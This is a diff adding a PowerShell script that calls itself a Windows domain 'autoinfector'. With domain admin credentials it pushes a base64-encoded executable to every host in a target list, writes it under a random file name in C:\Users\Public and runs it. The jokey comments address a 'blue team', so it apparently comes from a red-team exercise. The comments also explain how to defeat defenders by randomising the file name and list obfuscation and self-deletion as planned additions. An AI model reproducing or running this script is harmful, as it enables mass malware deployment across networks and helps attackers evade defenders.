@@ -1,0 +1,116 @@
+# Whole_Litter_of_Kittens.ps
+# Windows Domain autoinfector
+# Uses three files on target with domain admin creds to infect every system in range
+# Requires this script, target_hosts.txt, and an executable payload base 64 encoded
+# Recommend using the clean version of this script that lacks comments...don't make it too easy for the blue team  : )
+#  Hi Blue Team!  We love you!
+# Written by Deuces, fixed by JokersRwild, way mo' better by IronCat, cleaned up by Deuces,
+# still broken, banged on by Chiclet, re-enlightened by Deuces, mucked with by Ironcat, massaged by Chiclet, headbashed by Deuces,
+# made magical by Ironcat using six characters, gilded by Deuces, and given the gift of randomness and security by Chiclet.
+# TO DO:  Add XOR for code obfuscation, add a script self-delete capability
+# Go climb rocks
+#
+# INSTRUCTIONS:
+# HOSTS:
+# Put a list of all your target hosts in target_hosts.txt in the same folder as the software to be delivered
+# (current delivery location hardcoded to C:\Users\Public\)
+# Make sure that your target_hosts only have hosts, and have no leading
+# \\ before the hosts, trailing spaces, or empty lines
+#    For a list of hosts in range, you can type
+#               net view  > c:\users\target_hosts.txt
+#    and it will give you a "dirty" list of hosts in the c:\users\ directory.  Clean the file and remove the
+#    extra junk like the header, all the leading \\, trailing spaces, and the like.
+# PAYLOAD:
+# No need to change anything unless you want to change the delivery location.
+
+#Creds
+#Make sure you have admin creds if you're throwing to remote boxes!
+
+# Usage: Whole_Litter_of_Kittens.ps1 -Username "Administrator" -Password "D0m41nAdm1nP@$$word"
+
+[CmdletBinding()]
+Param(
+    [Parameter(Mandatory=$true, Position=0)]
+    [string]$Username = $( Read-Host "Input username" ),
+    [string]$Password = $( Read-Host "Input password" )
+)
+
+$secpw = ConvertTo-SecureString $Password -AsPlainText -Force
+$cred = New-Object Management.Automation.PSCredential ($Username, $secpw)
+
+#Variables
+$host_list= "target_hosts.txt"  #should look like EVILCORP-A310 not like \\EVILCORP-A310\, one entry per line, no spaces
+$file_name =  "harmless_kittens" #name of file you are uploading, should be base64 encoded already
+#     take whatever payload you have in linux and type base64 payloadname >harmless_kittens
+#     if your payload was made in windows, use certutil to encode it from a normal .exe into a base 64 file
+#     some good instructions on using certutil for base 64 encoding found here:
+#     https://dmfrsecurity.com/2017/01/07/windows-base64-encoding-and-decoding-using-certutil/
+
+$sourcepath = "C:\Users\Public\"  #where you put everything:  script, host list, and payload.  Be sure to include the trailing slash.
+$host_file = $sourcepath + $host_list
+$source_file = $sourcepath + $file_name
+$tar_host = Get-Content $host_file  #host target list file should be in the same file as the payload target
+$Kirby_B64File = Get-Content $source_file -raw #inhaling the B64 encoded file for delivery via Powershell
+#This section will install the software
+foreach ($computer in $tar_host)
+{
+    #$DestinationFolder = "\\$computer\C$\Users\Public"
+ ###  I got sick of putting everything in temp, now all files are in \users\public\
+ ###  in theory, this code below should allow you to specify an arbitrary directory if you fix what trails after $computer above
+ ###   if (!(Test-Path -path $destinationFolder))
+ ###       {
+ ###           New-Item $destinationFolder -Type Directory
+ ###       }
+#meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow
+#   Write-Host $DestinationFolder -ForegroundColor Green
+    Invoke-Command -asjob -Credential $cred -ComputerName $computer -args $Kirby_B64File -ScriptBlock {
+# Making blue team's job harder:  can't filter on name or length of payload
+# Executing this with the #asjob context allows them all to launch near-simultaneously.
+# Of course, this is all in the one directory.  We can fix that to arbitrary locations later, or alternate data streams, etc.
+        #$mytxt = Get-Date -Format 'yyyyMMddhhmmssfff'
+        #$r_filename = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($mytxt))
+        #$l = get-random -Minimum 5 -Maximum 11
+        #$2 = get-random -Minimum 10 -Maximum 18
+        #$r_filename = $r_filename.substring($2,$l)
+        #$r_filename_full = $r_filename + ".exe"
+        #$Reconstituted = "C:\Users\Public\"+$r_filename_full
+        $RandomStr = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count (Get-Random -Minimum 8 -Maximum 16) | % {[char]$_})
+        $Reconstituted = "C:\Users\Public\" + $RandomStr + ".exe"
+        [IO.File]::WriteAllBytes($Reconstituted, [Convert]::FromBase64String($args[0]))
+        # Now to execute the new file
+        cmd.exe /c $Reconstituted
+    }
+
+
+#meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow#
+#
+#
+
+
+# $sourcefile    # sample code used this as an unencrypted binary.  Ours starts out as an binary encoded as x64 on the throwing box.  Removing.
+#  The problem is, since we are actually executing on the receiving box, it has to refer to the location as remote;
+#  As a result, it isn't a c:\ path, it's a \\throwingbox\ path. Consequently, you can't just set $B64File = $sourcefile
+#
+#  But if you set \\throwingbox\ then you could run into SMB permissions issues.  Let's skip that altogether by baking the encoded 64 data directly into
+#  the powershell script.  We do this above by doing the following:
+#  $Kirby_B64File = Get-Content $file_name
+#
+#
+# Let's make this a little harder for them, so they can't just search for a string for a file name.
+# we are going to B64 encode the timestamp to the millisecond as the file name.
+#        $mytxt = Get-Date -Format 'yyyyMMddhhmmssfff'
+#        $r_filename = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($mytxt))
+#        $r_filename_full = $r_filename + ".exe"
+# $Reconstituted = "C:\Users\Public\"+$r_filename_full  #for us, this will execute local to the *remote* system,
+#                                                       so this is a path local to the remote box, not the throwing box.
+
+#    Why   [IO.File]::WriteAllBytes($Reconstituted, [Convert]::FromBase64String($args[0]))
+#    instead of ReadAllBytes(Kirby_B64File)?  because you need to pass the value of $Kirby from the local context to the remote--this is why we use args.
+
+# [IO.File]::WriteAllBytes($Reconstituted, [Convert]::FromBase64String([char[]][IO.File]::ReadAllBytes($Kirby_B64File)))
+
+# End Modded Code
+
+
+
+}
